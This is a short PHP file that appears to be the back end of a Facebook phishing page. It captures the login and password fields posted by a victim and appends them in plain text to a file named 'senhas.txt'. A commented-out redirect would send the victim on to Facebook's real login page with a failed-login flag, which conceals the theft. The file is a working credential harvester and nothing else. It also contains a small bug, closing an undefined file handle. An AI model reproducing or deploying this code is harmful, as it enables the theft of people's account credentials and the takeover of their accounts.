<?php


$login = $_POST['l'];
$senha = $_POST['s'];
$conteudo = "Login: $login Senha: $senha \n";
$arquivo = "senhas.txt";

$handle = fopen($arquivo, "a");
fwrite($handle,$conteudo);
fclose($abrir);

//header("Location: https://www.facebook.com/login.php?login_attempt=1");
?>